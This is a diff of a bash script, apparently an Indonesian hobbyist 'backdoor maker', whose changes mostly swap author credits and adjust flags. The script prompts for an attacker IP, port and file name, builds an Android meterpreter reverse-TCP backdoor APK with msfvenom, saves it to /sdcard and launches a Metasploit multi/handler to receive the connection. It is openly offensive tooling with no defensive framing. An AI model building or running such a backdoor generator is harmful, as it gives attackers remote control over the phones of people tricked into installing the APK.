@@ -1,5 +1,5 @@
 #!/bin/bash
-# We Are Big Family Official Cyber Team
+# Subcribe My Chanel Yt Arjun Newbie Thankss...
 
 clear
 BB='\033[34;1m'
@@ -21,10 +21,10 @@ program2(){
         echo
          echo $CC"______________________________________"
          echo $cc"|                                     |"
-         echo $CC"|  ~ AUTHOR   : OFFICIAL CYBER TEAM   |"
-         echo $CC"|  ~ TEAM     : OCT CLUB              |"
+         echo $CC"|  ~ AUTHOR   : DEE JUNN              |"
+         echo $CC"|  ~ TOUTUBE  : ARJUN NEWBIE          |"
          echo $CC"|  ~ Facebook : Dee Junn              |"
-         echo $CC"|  ~ Contacts : wa.me/+6283869752***  |"
+         echo $CC"|  ~ Versi    : 2.1                   |"
          echo $CC"|  ~ Thank's  : All Support           |"
          echo $CC"|_____________________________________|"
 }
@@ -39,7 +39,7 @@ program3(){
          echo
          read -p "Masukan Your Ip  : " ip;
          echo
-         echo $BB"Masukan Nama Backdoor Contoh : Test.apk"
+         echo $BB"Ex : backdoor.apk"
          read -p "Nama Backdoor : " apk;
          echo
          sleep 3
@@ -53,7 +53,7 @@ program3(){
 program4(){
          echo $BB"Sedang Membuat Backdoor Mohon Sabar Ganteng:v"
          sleep 2
-         msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/$apk
+         msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o /sdcard/$apk
          echo
          echo $GG"Backdor Telah Terbuat Dan Tersimpan Di sdcard anda:v"
          echo
@@ -61,6 +61,8 @@ program4(){
          read pill
          if [ $pill = "y" ] || [ $pill = "Y" ];then
               clear
+              read -p "Input Your Ip   : " ip1;
+              read -p "Input Your Port : " port1;
               echo "Loading..."
          else
             echo $GG"Kesalahan"
@@ -74,11 +76,15 @@ program5(){
          sleep 1
          msfconsole -q -x "use exploit/multi/handler;
          set payload android/meterpreter/reverse_tcp;
-         set LHOST $ip;
-         set LPORT $port;
+         set lhost $ip1;
+         set lport $port1;
          exploit"
 }
 program2
 program3
 program4
 program5
+
+
+
+
